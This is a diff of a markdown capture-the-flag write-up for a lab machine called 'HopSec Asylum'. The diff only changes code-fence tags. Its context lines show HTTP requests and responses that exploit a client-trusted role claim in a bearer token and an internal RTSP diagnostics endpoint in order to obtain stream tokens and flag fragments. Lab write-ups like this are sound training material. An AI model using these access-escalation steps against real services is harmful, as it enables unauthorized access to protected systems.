@@ -80,7 +80,7 @@ Given the number of HTTP services, each web port was manually reviewed.
 
 Accessing **port 8080** revealed a login interface labeled:
 
-```bash
+```
 **“HopSec Security Console”**
 ```
 
@@ -92,7 +92,7 @@ This appears to be a protected administrative or internal security portal requir
 
 Port **13400** hosted another login page titled:
 
-```bash
+```
 **“HopSec Asylum – Facility Video Portal”**
 ```
 
@@ -260,13 +260,13 @@ This indicated a privilege escalation, as the backend trusted the client-supplie
 
 Using the returned `ticket_id`, the following request was made:
 
-```
+```http
 GET /v1/streams/5b141519-31ae-4b23-8e75-9137f72c4568/manifest.m3u8
 ```
 
 The response was a valid **HLS playlist.**
 
-```bash
+```http
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:17:40 GMT
@@ -310,7 +310,7 @@ Along with a note indicating that this was only **part of the second flag**.
 
 **Note:**
 
-```python
+```
 *“This is only the first part of your second flag. You will need to complete it elsewhere.”*
 ```
 
@@ -327,7 +327,7 @@ These endpoints hinted at **internal RTSP ingest diagnostics**.
 
 A `GET` request to `/v1/ingest/diagnostics` returned `405 Method Not Allowed`, revealing that the endpoint only accepted `POST`.
 
-```bash
+```http
 HTTP/1.1 405 METHOD NOT ALLOWED
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:59:38 GMT
@@ -357,7 +357,7 @@ However, the server initially returned an error indicating that the **`rtsp_url`
 
 To resolve this, a valid RTSP URL was supplied in the bash body of the request:
 
-```bash
+```http
 POST /v1/ingest/diagnostics HTTP/1.1
 Host: 10.80.173.124:13401
 Content-Length: 58
@@ -379,7 +379,7 @@ Connection: keep-alive
 
 The server responded with `200 OK`, returning a **job identifier** and a **job status endpoint**, indicating that the diagnostic task was successfully created.
 
-```bash
+```http
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:51:04 GMT
@@ -398,7 +398,7 @@ Connection: close
 
 I then made a `GET` request to the job status endpoint provided in the previous response in order to monitor the diagnostic job execution.
 
-```bash
+```http
 GET /v1/ingest/jobs/b4ec25ab-944f-43ad-81bf-18755d627ed5 HTTP/1.1
 Host: 10.80.173.124:13401
 Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1765746887}.61a477c34a43658af9c00f0d9a7d7cb65bfdb46fb7a8b8aac75f5eca7a9ef9a7
@@ -413,7 +413,7 @@ Connection: keep-alive
 
 The response indicated that the job had completed successfully and returned several important details, including a **console port** and a **token** associated with the `vendor-cam` RTSP stream.
 
-```bash
+```http
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:51:39 GMT
@@ -431,7 +431,7 @@ Connection: close
 
 From the response, we obtained the following token:
 
-```bash
+```
 e5a01cf9e0e94a9ca515a6a5d2037ce9
 ```
 
